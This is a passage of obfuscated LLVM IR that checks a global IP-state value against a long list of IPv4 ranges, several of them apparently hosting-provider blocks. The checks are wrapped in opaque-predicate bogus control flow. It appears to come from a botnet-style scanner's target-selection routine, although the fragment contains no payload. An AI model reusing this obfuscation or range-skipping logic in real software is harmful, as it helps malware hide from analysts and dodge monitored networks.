  %2227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2228 = zext i8 %2227 to i32
  %2229 = icmp eq i32 %2228, 236
  br i1 %2229, label %4994, label %2230

; <label>:2230:                                   ; preds = %2226, %2222
  %2231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2232 = zext i8 %2231 to i32
  %2233 = icmp eq i32 %2232, 107
  br i1 %2233, label %2234, label %2238

; <label>:2234:                                   ; preds = %2230
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 170
  br i1 %2237, label %4994, label %2238

; <label>:2238:                                   ; preds = %2234, %2230
  %2239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2240 = zext i8 %2239 to i32
  %2241 = icmp eq i32 %2240, 138
  br i1 %2241, label %2242, label %2246

; <label>:2242:                                   ; preds = %2238
  %2243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2244 = zext i8 %2243 to i32
  %2245 = icmp eq i32 %2244, 197
  br i1 %2245, label %4994, label %2246

; <label>:2246:                                   ; preds = %2242, %2238
  %2247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2248 = zext i8 %2247 to i32
  %2249 = icmp eq i32 %2248, 138
  br i1 %2249, label %2250, label %2270

; <label>:2250:                                   ; preds = %2246
  %2251 = load i32, i32* @x.69
  %2252 = load i32, i32* @y.70
  %2253 = sub i32 %2251, 1
  %2254 = mul i32 %2251, %2253
  %2255 = urem i32 %2254, 2
  %2256 = icmp eq i32 %2255, 0
  %2257 = icmp slt i32 %2252, 10
  %2258 = or i1 %2256, %2257
  br i1 %2258, label %originalBB316, label %originalBB316alteredBB

originalBB316:                                    ; preds = %originalBB316alteredBB, %2250
  %2259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2260 = zext i8 %2259 to i32
  %2261 = icmp eq i32 %2260, 68
  %2262 = load i32, i32* @x.69
  %2263 = load i32, i32* @y.70
  %2264 = sub i32 %2262, 1
  %2265 = mul i32 %2262, %2264
  %2266 = urem i32 %2265, 2
  %2267 = icmp eq i32 %2266, 0
  %2268 = icmp slt i32 %2263, 10
  %2269 = or i1 %2267, %2268
  br i1 %2269, label %originalBBpart2318, label %originalBB316alteredBB

originalBBpart2318:                               ; preds = %originalBB316
  br i1 %2261, label %4994, label %2270

; <label>:2270:                                   ; preds = %originalBBpart2318, %2246
  %2271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2272 = zext i8 %2271 to i32
  %2273 = icmp eq i32 %2272, 139
  br i1 %2273, label %2274, label %2294

; <label>:2274:                                   ; preds = %2270
  %2275 = load i32, i32* @x.69
  %2276 = load i32, i32* @y.70
  %2277 = sub i32 %2275, 1
  %2278 = mul i32 %2275, %2277
  %2279 = urem i32 %2278, 2
  %2280 = icmp eq i32 %2279, 0
  %2281 = icmp slt i32 %2276, 10
  %2282 = or i1 %2280, %2281
  br i1 %2282, label %originalBB320, label %originalBB320alteredBB

originalBB320:                                    ; preds = %originalBB320alteredBB, %2274
  %2283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2284 = zext i8 %2283 to i32
  %2285 = icmp eq i32 %2284, 59
  %2286 = load i32, i32* @x.69
  %2287 = load i32, i32* @y.70
  %2288 = sub i32 %2286, 1
  %2289 = mul i32 %2286, %2288
  %2290 = urem i32 %2289, 2
  %2291 = icmp eq i32 %2290, 0
  %2292 = icmp slt i32 %2287, 10
  %2293 = or i1 %2291, %2292
  br i1 %2293, label %originalBBpart2322, label %originalBB320alteredBB

originalBBpart2322:                               ; preds = %originalBB320
  br i1 %2285, label %4994, label %2294

; <label>:2294:                                   ; preds = %originalBBpart2322, %2270
  %2295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2296 = zext i8 %2295 to i32
  %2297 = icmp eq i32 %2296, 146
  br i1 %2297, label %2298, label %2326

; <label>:2298:                                   ; preds = %2294
  %2299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2300 = zext i8 %2299 to i32
  %2301 = icmp eq i32 %2300, 185
  br i1 %2301, label %2302, label %2326

; <label>:2302:                                   ; preds = %2298
  %2303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2304 = zext i8 %2303 to i32
  %2305 = icmp sge i32 %2304, 128
  br i1 %2305, label %2306, label %2326

; <label>:2306:                                   ; preds = %2302
  %2307 = load i32, i32* @x.69
  %2308 = load i32, i32* @y.70
  %2309 = sub i32 %2307, 1
  %2310 = mul i32 %2307, %2309
  %2311 = urem i32 %2310, 2
  %2312 = icmp eq i32 %2311, 0
  %2313 = icmp slt i32 %2308, 10
  %2314 = or i1 %2312, %2313
  br i1 %2314, label %originalBB324, label %originalBB324alteredBB

originalBB324:                                    ; preds = %originalBB324alteredBB, %2306
  %2315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2316 = zext i8 %2315 to i32
  %2317 = icmp slt i32 %2316, 191
  %2318 = load i32, i32* @x.69
  %2319 = load i32, i32* @y.70
  %2320 = sub i32 %2318, 1
  %2321 = mul i32 %2318, %2320
  %2322 = urem i32 %2321, 2
  %2323 = icmp eq i32 %2322, 0
  %2324 = icmp slt i32 %2319, 10
  %2325 = or i1 %2323, %2324
  br i1 %2325, label %originalBBpart2326, label %originalBB324alteredBB

originalBBpart2326:                               ; preds = %originalBB324
  br i1 %2317, label %4994, label %2326

; <label>:2326:                                   ; preds = %originalBBpart2326, %2302, %2298, %2294
  %2327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2328 = zext i8 %2327 to i32
  %2329 = icmp eq i32 %2328, 163
  br i1 %2329, label %2330, label %2358

; <label>:2330:                                   ; preds = %2326
  %2331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2332 = zext i8 %2331 to i32
  %2333 = icmp eq i32 %2332, 47
  br i1 %2333, label %2334, label %2358

; <label>:2334:                                   ; preds = %2330
  %2335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2336 = zext i8 %2335 to i32
  %2337 = icmp sge i32 %2336, 10
  br i1 %2337, label %2338, label %2358

; <label>:2338:                                   ; preds = %2334
  %2339 = load i32, i32* @x.69
  %2340 = load i32, i32* @y.70
  %2341 = sub i32 %2339, 1
  %2342 = mul i32 %2339, %2341
  %2343 = urem i32 %2342, 2
  %2344 = icmp eq i32 %2343, 0
  %2345 = icmp slt i32 %2340, 10
  %2346 = or i1 %2344, %2345
  br i1 %2346, label %originalBB328, label %originalBB328alteredBB

originalBB328:                                    ; preds = %originalBB328alteredBB, %2338
  %2347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2348 = zext i8 %2347 to i32
  %2349 = icmp slt i32 %2348, 11
  %2350 = load i32, i32* @x.69
  %2351 = load i32, i32* @y.70
  %2352 = sub i32 %2350, 1
  %2353 = mul i32 %2350, %2352
  %2354 = urem i32 %2353, 2
  %2355 = icmp eq i32 %2354, 0
  %2356 = icmp slt i32 %2351, 10
  %2357 = or i1 %2355, %2356
  br i1 %2357, label %originalBBpart2330, label %originalBB328alteredBB

originalBBpart2330:                               ; preds = %originalBB328
  br i1 %2349, label %4994, label %2358

; <label>:2358:                                   ; preds = %originalBBpart2330, %2334, %2330, %2326
  %2359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2360 = zext i8 %2359 to i32
  %2361 = icmp eq i32 %2360, 174
  br i1 %2361, label %2362, label %2374

; <label>:2362:                                   ; preds = %2358
  %2363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2364 = zext i8 %2363 to i32
  %2365 = icmp eq i32 %2364, 138
  br i1 %2365, label %2366, label %2374

; <label>:2366:                                   ; preds = %2362
  %2367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2368 = zext i8 %2367 to i32
  %2369 = icmp sge i32 %2368, 1
  br i1 %2369, label %2370, label %2374

; <label>:2370:                                   ; preds = %2366
  %2371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2372 = zext i8 %2371 to i32
  %2373 = icmp slt i32 %2372, 127
  br i1 %2373, label %4994, label %2374

; <label>:2374:                                   ; preds = %2370, %2366, %2362, %2358
  %2375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2376 = zext i8 %2375 to i32
  %2377 = icmp eq i32 %2376, 192
  br i1 %2377, label %2378, label %2406

; <label>:2378:                                   ; preds = %2374
  %2379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2380 = zext i8 %2379 to i32
  %2381 = icmp eq i32 %2380, 241
  br i1 %2381, label %2382, label %2406

; <label>:2382:                                   ; preds = %2378
  %2383 = load i32, i32* @x.69
  %2384 = load i32, i32* @y.70
  %2385 = sub i32 %2383, 1
  %2386 = mul i32 %2383, %2385
  %2387 = urem i32 %2386, 2
  %2388 = icmp eq i32 %2387, 0
  %2389 = icmp slt i32 %2384, 10
  %2390 = or i1 %2388, %2389
  br i1 %2390, label %originalBB332, label %originalBB332alteredBB

originalBB332:                                    ; preds = %originalBB332alteredBB, %2382
  %2391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2392 = zext i8 %2391 to i32
  %2393 = icmp sge i32 %2392, 128
  %2394 = load i32, i32* @x.69
  %2395 = load i32, i32* @y.70
  %2396 = sub i32 %2394, 1
  %2397 = mul i32 %2394, %2396
  %2398 = urem i32 %2397, 2
  %2399 = icmp eq i32 %2398, 0
  %2400 = icmp slt i32 %2395, 10
  %2401 = or i1 %2399, %2400
  br i1 %2401, label %originalBBpart2334, label %originalBB332alteredBB

originalBBpart2334:                               ; preds = %originalBB332
  br i1 %2393, label %2402, label %2406

; <label>:2402:                                   ; preds = %originalBBpart2334
  %2403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2404 = zext i8 %2403 to i32
  %2405 = icmp slt i32 %2404, 255
  br i1 %2405, label %4994, label %2406

; <label>:2406:                                   ; preds = %2402, %originalBBpart2334, %2378, %2374
  %2407 = load i32, i32* @x.69
  %2408 = load i32, i32* @y.70
  %2409 = sub i32 %2407, 1
  %2410 = mul i32 %2407, %2409
  %2411 = urem i32 %2410, 2
  %2412 = icmp eq i32 %2411, 0
  %2413 = icmp slt i32 %2408, 10
  %2414 = or i1 %2412, %2413
  br i1 %2414, label %originalBB336, label %originalBB336alteredBB

originalBB336:                                    ; preds = %originalBB336alteredBB, %2406
  %2415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2416 = zext i8 %2415 to i32
  %2417 = icmp eq i32 %2416, 198
  %2418 = load i32, i32* @x.69
  %2419 = load i32, i32* @y.70
  %2420 = sub i32 %2418, 1
  %2421 = mul i32 %2418, %2420
  %2422 = urem i32 %2421, 2
  %2423 = icmp eq i32 %2422, 0
  %2424 = icmp slt i32 %2419, 10
  %2425 = or i1 %2423, %2424
  br i1 %2425, label %originalBBpart2338, label %originalBB336alteredBB

originalBBpart2338:                               ; preds = %originalBB336
  br i1 %2417, label %2426, label %2438

; <label>:2426:                                   ; preds = %originalBBpart2338
  %2427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2428 = zext i8 %2427 to i32
  %2429 = icmp eq i32 %2428, 199
  br i1 %2429, label %2430, label %2438

; <label>:2430:                                   ; preds = %2426
  %2431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2432 = zext i8 %2431 to i32
  %2433 = icmp sge i32 %2432, 64
  br i1 %2433, label %2434, label %2438

; <label>:2434:                                   ; preds = %2430
  %2435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2436 = zext i8 %2435 to i32
  %2437 = icmp slt i32 %2436, 127
  br i1 %2437, label %4994, label %2438

; <label>:2438:                                   ; preds = %2434, %2430, %2426, %originalBBpart2338
  %2439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2440 = zext i8 %2439 to i32
  %2441 = icmp eq i32 %2440, 198
  br i1 %2441, label %2442, label %2470

; <label>:2442:                                   ; preds = %2438
  %2443 = load i32, i32* @x.69
  %2444 = load i32, i32* @y.70
  %2445 = sub i32 %2443, 1
  %2446 = mul i32 %2443, %2445
  %2447 = urem i32 %2446, 2
  %2448 = icmp eq i32 %2447, 0
  %2449 = icmp slt i32 %2444, 10
  %2450 = or i1 %2448, %2449
  br i1 %2450, label %originalBB340, label %originalBB340alteredBB

originalBB340:                                    ; preds = %originalBB340alteredBB, %2442
  %2451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2452 = zext i8 %2451 to i32
  %2453 = icmp eq i32 %2452, 211
  %2454 = load i32, i32* @x.69
  %2455 = load i32, i32* @y.70
  %2456 = sub i32 %2454, 1
  %2457 = mul i32 %2454, %2456
  %2458 = urem i32 %2457, 2
  %2459 = icmp eq i32 %2458, 0
  %2460 = icmp slt i32 %2455, 10
  %2461 = or i1 %2459, %2460
  br i1 %2461, label %originalBBpart2342, label %originalBB340alteredBB

originalBBpart2342:                               ; preds = %originalBB340
  br i1 %2453, label %2462, label %2470

; <label>:2462:                                   ; preds = %originalBBpart2342
  %2463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2464 = zext i8 %2463 to i32
  %2465 = icmp sge i32 %2464, 96
  br i1 %2465, label %2466, label %2470

; <label>:2466:                                   ; preds = %2462
  %2467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2468 = zext i8 %2467 to i32
  %2469 = icmp slt i32 %2468, 127
  br i1 %2469, label %4994, label %2470

; <label>:2470:                                   ; preds = %2466, %2462, %originalBBpart2342, %2438
  %2471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2472 = zext i8 %2471 to i32
  %2473 = icmp eq i32 %2472, 207
  br i1 %2473, label %2474, label %2486

; <label>:2474:                                   ; preds = %2470
  %2475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2476 = zext i8 %2475 to i32
  %2477 = icmp eq i32 %2476, 154
  br i1 %2477, label %2478, label %2486

; <label>:2478:                                   ; preds = %2474
  %2479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2480 = zext i8 %2479 to i32
  %2481 = icmp sge i32 %2480, 192
  br i1 %2481, label %2482, label %2486

; <label>:2482:                                   ; preds = %2478
  %2483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2484 = zext i8 %2483 to i32
  %2485 = icmp slt i32 %2484, 255
  br i1 %2485, label %4994, label %2486

; <label>:2486:                                   ; preds = %2482, %2478, %2474, %2470
  %2487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2488 = zext i8 %2487 to i32
  %2489 = icmp eq i32 %2488, 37
  br i1 %2489, label %2490, label %2502

; <label>:2490:                                   ; preds = %2486
  %2491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2492 = zext i8 %2491 to i32
  %2493 = icmp eq i32 %2492, 139
  br i1 %2493, label %2494, label %2502

; <label>:2494:                                   ; preds = %2490
  %2495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2496 = zext i8 %2495 to i32
  %2497 = icmp sge i32 %2496, 1
  br i1 %2497, label %2498, label %2502

; <label>:2498:                                   ; preds = %2494
  %2499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2500 = zext i8 %2499 to i32
  %2501 = icmp slt i32 %2500, 31
  br i1 %2501, label %4994, label %2502

; <label>:2502:                                   ; preds = %2498, %2494, %2490, %2486
  %2503 = load i32, i32* @x.69
  %2504 = load i32, i32* @y.70
  %2505 = sub i32 %2503, 1
  %2506 = mul i32 %2503, %2505
  %2507 = urem i32 %2506, 2
  %2508 = icmp eq i32 %2507, 0
  %2509 = icmp slt i32 %2504, 10
  %2510 = or i1 %2508, %2509
  br i1 %2510, label %originalBB344, label %originalBB344alteredBB

originalBB344:                                    ; preds = %originalBB344alteredBB, %2502
  %2511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2512 = zext i8 %2511 to i32
  %2513 = icmp eq i32 %2512, 67
  %2514 = load i32, i32* @x.69
  %2515 = load i32, i32* @y.70
  %2516 = sub i32 %2514, 1
  %2517 = mul i32 %2514, %2516
  %2518 = urem i32 %2517, 2
  %2519 = icmp eq i32 %2518, 0
  %2520 = icmp slt i32 %2515, 10
  %2521 = or i1 %2519, %2520
  br i1 %2521, label %originalBBpart2346, label %originalBB344alteredBB

originalBBpart2346:                               ; preds = %originalBB344
  br i1 %2513, label %2522, label %2566

; <label>:2522:                                   ; preds = %originalBBpart2346
  %2523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2524 = zext i8 %2523 to i32
  %2525 = icmp eq i32 %2524, 207
  br i1 %2525, label %2526, label %2566

; <label>:2526:                                   ; preds = %2522
  %2527 = load i32, i32* @x.69
  %2528 = load i32, i32* @y.70
  %2529 = sub i32 %2527, 1
  %2530 = mul i32 %2527, %2529
  %2531 = urem i32 %2530, 2
  %2532 = icmp eq i32 %2531, 0
  %2533 = icmp slt i32 %2528, 10
  %2534 = or i1 %2532, %2533
  br i1 %2534, label %originalBB348, label %originalBB348alteredBB

originalBB348:                                    ; preds = %originalBB348alteredBB, %2526
  %2535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2536 = zext i8 %2535 to i32
  %2537 = icmp sge i32 %2536, 64
  %2538 = load i32, i32* @x.69
  %2539 = load i32, i32* @y.70
  %2540 = sub i32 %2538, 1
  %2541 = mul i32 %2538, %2540
  %2542 = urem i32 %2541, 2
  %2543 = icmp eq i32 %2542, 0
  %2544 = icmp slt i32 %2539, 10
  %2545 = or i1 %2543, %2544
  br i1 %2545, label %originalBBpart2350, label %originalBB348alteredBB

originalBBpart2350:                               ; preds = %originalBB348
  br i1 %2537, label %2546, label %2566

; <label>:2546:                                   ; preds = %originalBBpart2350
  %2547 = load i32, i32* @x.69
  %2548 = load i32, i32* @y.70
  %2549 = sub i32 %2547, 1
  %2550 = mul i32 %2547, %2549
  %2551 = urem i32 %2550, 2
  %2552 = icmp eq i32 %2551, 0
  %2553 = icmp slt i32 %2548, 10
  %2554 = or i1 %2552, %2553
  br i1 %2554, label %originalBB352, label %originalBB352alteredBB

originalBB352:                                    ; preds = %originalBB352alteredBB, %2546
  %2555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2556 = zext i8 %2555 to i32
  %2557 = icmp slt i32 %2556, 95
  %2558 = load i32, i32* @x.69
  %2559 = load i32, i32* @y.70
  %2560 = sub i32 %2558, 1
  %2561 = mul i32 %2558, %2560
  %2562 = urem i32 %2561, 2
  %2563 = icmp eq i32 %2562, 0
  %2564 = icmp slt i32 %2559, 10
  %2565 = or i1 %2563, %2564
  br i1 %2565, label %originalBBpart2354, label %originalBB352alteredBB

originalBBpart2354:                               ; preds = %originalBB352
  br i1 %2557, label %4994, label %2566

; <label>:2566:                                   ; preds = %originalBBpart2354, %originalBBpart2350, %2522, %originalBBpart2346
  %2567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2568 = zext i8 %2567 to i32
  %2569 = icmp eq i32 %2568, 67
  br i1 %2569, label %2570, label %2582

; <label>:2570:                                   ; preds = %2566
  %2571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2572 = zext i8 %2571 to i32
  %2573 = icmp eq i32 %2572, 205
  br i1 %2573, label %2574, label %2582

; <label>:2574:                                   ; preds = %2570
  %2575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2576 = zext i8 %2575 to i32
  %2577 = icmp sge i32 %2576, 128
  br i1 %2577, label %2578, label %2582

; <label>:2578:                                   ; preds = %2574
  %2579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2580 = zext i8 %2579 to i32
  %2581 = icmp slt i32 %2580, 191
  br i1 %2581, label %4994, label %2582

; <label>:2582:                                   ; preds = %2578, %2574, %2570, %2566
  %2583 = load i32, i32* @x.69
  %2584 = load i32, i32* @y.70
  %2585 = sub i32 %2583, 1
  %2586 = mul i32 %2583, %2585
  %2587 = urem i32 %2586, 2
  %2588 = icmp eq i32 %2587, 0
  %2589 = icmp slt i32 %2584, 10
  %2590 = or i1 %2588, %2589
  br i1 %2590, label %originalBB356, label %originalBB356alteredBB

originalBB356:                                    ; preds = %originalBB356alteredBB, %2582
  %2591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2592 = zext i8 %2591 to i32
  %2593 = icmp eq i32 %2592, 80
  %2594 = load i32, i32* @x.69
  %2595 = load i32, i32* @y.70
  %2596 = sub i32 %2594, 1
  %2597 = mul i32 %2594, %2596
  %2598 = urem i32 %2597, 2
  %2599 = icmp eq i32 %2598, 0
  %2600 = icmp slt i32 %2595, 10
  %2601 = or i1 %2599, %2600
  br i1 %2601, label %originalBBpart2358, label %originalBB356alteredBB

originalBBpart2358:                               ; preds = %originalBB356
  br i1 %2593, label %2602, label %2630

; <label>:2602:                                   ; preds = %originalBBpart2358
  %2603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2604 = zext i8 %2603 to i32
  %2605 = icmp eq i32 %2604, 240
  br i1 %2605, label %2606, label %2630

; <label>:2606:                                   ; preds = %2602
  %2607 = load i32, i32* @x.69
  %2608 = load i32, i32* @y.70
  %2609 = sub i32 %2607, 1
  %2610 = mul i32 %2607, %2609
  %2611 = urem i32 %2610, 2
  %2612 = icmp eq i32 %2611, 0
  %2613 = icmp slt i32 %2608, 10
  %2614 = or i1 %2612, %2613
  br i1 %2614, label %originalBB360, label %originalBB360alteredBB

originalBB360:                                    ; preds = %originalBB360alteredBB, %2606
  %2615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2616 = zext i8 %2615 to i32
  %2617 = icmp sge i32 %2616, 128
  %2618 = load i32, i32* @x.69
  %2619 = load i32, i32* @y.70
  %2620 = sub i32 %2618, 1
  %2621 = mul i32 %2618, %2620
  %2622 = urem i32 %2621, 2
  %2623 = icmp eq i32 %2622, 0
  %2624 = icmp slt i32 %2619, 10
  %2625 = or i1 %2623, %2624
  br i1 %2625, label %originalBBpart2362, label %originalBB360alteredBB

originalBBpart2362:                               ; preds = %originalBB360
  br i1 %2617, label %2626, label %2630

; <label>:2626:                                   ; preds = %originalBBpart2362
  %2627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2628 = zext i8 %2627 to i32
  %2629 = icmp slt i32 %2628, 143
  br i1 %2629, label %4994, label %2630

; <label>:2630:                                   ; preds = %2626, %originalBBpart2362, %2602, %originalBBpart2358
  %2631 = load i32, i32* @x.69
  %2632 = load i32, i32* @y.70
  %2633 = sub i32 %2631, 1
  %2634 = mul i32 %2631, %2633
  %2635 = urem i32 %2634, 2
  %2636 = icmp eq i32 %2635, 0
  %2637 = icmp slt i32 %2632, 10
  %2638 = or i1 %2636, %2637
  br i1 %2638, label %originalBB364, label %originalBB364alteredBB

originalBB364:                                    ; preds = %originalBB364alteredBB, %2630
  %2639 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2640 = zext i8 %2639 to i32
  %2641 = icmp eq i32 %2640, 82
  %2642 = load i32, i32* @x.69
  %2643 = load i32, i32* @y.70
  %2644 = sub i32 %2642, 1
  %2645 = mul i32 %2642, %2644
  %2646 = urem i32 %2645, 2
  %2647 = icmp eq i32 %2646, 0
  %2648 = icmp slt i32 %2643, 10
  %2649 = or i1 %2647, %2648
  br i1 %2649, label %originalBBpart2366, label %originalBB364alteredBB

originalBBpart2366:                               ; preds = %originalBB364
  br i1 %2641, label %2650, label %2694

; <label>:2650:                                   ; preds = %originalBBpart2366
  %2651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2652 = zext i8 %2651 to i32
  %2653 = icmp eq i32 %2652, 196
  br i1 %2653, label %2654, label %2694

; <label>:2654:                                   ; preds = %2650
  %2655 = load i32, i32* @x.69
  %2656 = load i32, i32* @y.70
  %2657 = sub i32 %2655, 1
  %2658 = mul i32 %2655, %2657
  %2659 = urem i32 %2658, 2
  %2660 = icmp eq i32 %2659, 0
  %2661 = icmp slt i32 %2656, 10
  %2662 = or i1 %2660, %2661
  br i1 %2662, label %originalBB368, label %originalBB368alteredBB

originalBB368:                                    ; preds = %originalBB368alteredBB, %2654
  %2663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2664 = zext i8 %2663 to i32
  %2665 = icmp sge i32 %2664, 1
  %2666 = load i32, i32* @x.69
  %2667 = load i32, i32* @y.70
  %2668 = sub i32 %2666, 1
  %2669 = mul i32 %2666, %2668
  %2670 = urem i32 %2669, 2
  %2671 = icmp eq i32 %2670, 0
  %2672 = icmp slt i32 %2667, 10
  %2673 = or i1 %2671, %2672
  br i1 %2673, label %originalBBpart2370, label %originalBB368alteredBB

originalBBpart2370:                               ; preds = %originalBB368
  br i1 %2665, label %2674, label %2694

; <label>:2674:                                   ; preds = %originalBBpart2370
  %2675 = load i32, i32* @x.69
  %2676 = load i32, i32* @y.70
  %2677 = sub i32 %2675, 1
  %2678 = mul i32 %2675, %2677
  %2679 = urem i32 %2678, 2
  %2680 = icmp eq i32 %2679, 0
  %2681 = icmp slt i32 %2676, 10
  %2682 = or i1 %2680, %2681
  br i1 %2682, label %originalBB372, label %originalBB372alteredBB

originalBB372:                                    ; preds = %originalBB372alteredBB, %2674
  %2683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2684 = zext i8 %2683 to i32
  %2685 = icmp slt i32 %2684, 15
  %2686 = load i32, i32* @x.69
  %2687 = load i32, i32* @y.70
  %2688 = sub i32 %2686, 1
  %2689 = mul i32 %2686, %2688
  %2690 = urem i32 %2689, 2
  %2691 = icmp eq i32 %2690, 0
  %2692 = icmp slt i32 %2687, 10
  %2693 = or i1 %2691, %2692
  br i1 %2693, label %originalBBpart2374, label %originalBB372alteredBB

originalBBpart2374:                               ; preds = %originalBB372
  br i1 %2685, label %4994, label %2694

; <label>:2694:                                   ; preds = %originalBBpart2374, %originalBBpart2370, %2650, %originalBBpart2366
  %2695 = load i32, i32* @x.69
  %2696 = load i32, i32* @y.70
  %2697 = sub i32 %2695, 1
  %2698 = mul i32 %2695, %2697
  %2699 = urem i32 %2698, 2
  %2700 = icmp eq i32 %2699, 0
  %2701 = icmp slt i32 %2696, 10
  %2702 = or i1 %2700, %2701
  br i1 %2702, label %originalBB376, label %originalBB376alteredBB

originalBB376:                                    ; preds = %originalBB376alteredBB, %2694
  %2703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2704 = zext i8 %2703 to i32
  %2705 = icmp eq i32 %2704, 95
  %2706 = load i32, i32* @x.69
  %2707 = load i32, i32* @y.70
  %2708 = sub i32 %2706, 1
  %2709 = mul i32 %2706, %2708
  %2710 = urem i32 %2709, 2
  %2711 = icmp eq i32 %2710, 0
